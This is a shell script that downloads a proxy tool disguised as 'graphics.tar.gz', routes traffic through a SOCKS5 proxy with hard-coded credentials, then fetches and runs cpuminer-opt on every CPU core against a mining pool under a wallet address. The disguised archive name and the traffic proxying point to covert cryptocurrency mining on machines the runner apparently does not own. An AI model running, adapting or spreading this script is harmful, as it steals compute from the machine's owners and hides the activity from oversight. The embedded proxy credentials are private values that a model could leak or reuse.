#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 103.120.18.250:1080

socks5_username = temera88

socks5_password = Nung1234

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz

./graftcp/graftcp ./cpuminer-avx2 -a yescryptr16 -o stratum+tcp://stratum-eu.rplant.xyz:7044 -u FfxRXbj1pXckxSJm2MMXA7sEB7wghwSkAM.CPU -p x -t$(nproc --all)
